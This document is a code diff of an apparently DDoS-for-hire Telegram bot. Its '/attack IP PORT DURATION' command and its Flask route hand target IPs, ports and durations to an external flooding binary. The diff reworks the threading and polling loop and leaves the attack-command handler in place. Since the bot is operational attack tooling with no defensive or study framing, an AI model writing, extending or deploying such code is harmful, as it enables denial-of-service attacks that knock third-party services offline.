@@ -4,8 +4,10 @@ import logging
 import subprocess
 import random
 import time
+import asyncio
 from threading import Thread
 from flask import Flask
+from cryptography.fernet import Fernet
 
 # Configuration
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Fetch token from environment variable
@@ -20,21 +22,10 @@ logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s
 REQUEST_INTERVAL = 1
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-# Flask app
-app = Flask(__name__)
-
-@app.route('/')
-def hello_world():
-    return "Hello, World!"
-
-@app.route('/run_c_code')
-def run_c_code():
-    try:
-        result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True, check=True)
-        return result.stdout
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Error running C code: {e}")
-        return f"Error: {e}"
+# Asyncio loop
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
 
 # Proxy Update
 def update_proxy():
@@ -87,32 +78,37 @@ def process_attack_command(message):
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
-        bot.send_message(message.chat.id, "An error occurred while processing your request.", parse_mode='Markdown')
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
     bot.send_message(message.chat.id, "Use `/attack IP PORT DURATION` to launch an attack. `/help` for assistance.", parse_mode='Markdown')
 
-# Thread Runner
-def run_flask():
-    try:
-        logging.info("Starting Flask server...")
-        app.run(host="0.0.0.0", port=5000)
-    except Exception as e:
-        logging.error(f"Flask server error: {e}")
+# Flask app
+app = Flask(__name__)
 
-def run_telegram_bot():
-    try:
-        logging.info("Starting Telegram bot...")
-        bot.polling(none_stop=True)
-    except Exception as e:
-        logging.error(f"Telegram Bot Error: {e}")
-        time.sleep(REQUEST_INTERVAL)  # Retry after a short delay
+@app.route('/')
+def hello_world():
+    return "Hello, World!"
 
+@app.route('/run_c_code')
+def run_c_code():
+    result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True)
+    return result.stdout
+
+# Main function
 if __name__ == '__main__':
-    # Start Flask server in a separate thread
-    flask_thread = Thread(target=run_flask, daemon=True)
+    # Start asyncio thread
+    asyncio_thread = Thread(target=lambda: asyncio.run(start_asyncio_loop()), daemon=True)
+    asyncio_thread.start()
+
+    # Start Flask app in a separate thread
+    flask_thread = Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}, daemon=True)
     flask_thread.start()
 
-    # Start Telegram bot in the main thread
-    run_telegram_bot()
+    logging.info("Starting Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        time.sleep(REQUEST_INTERVAL)
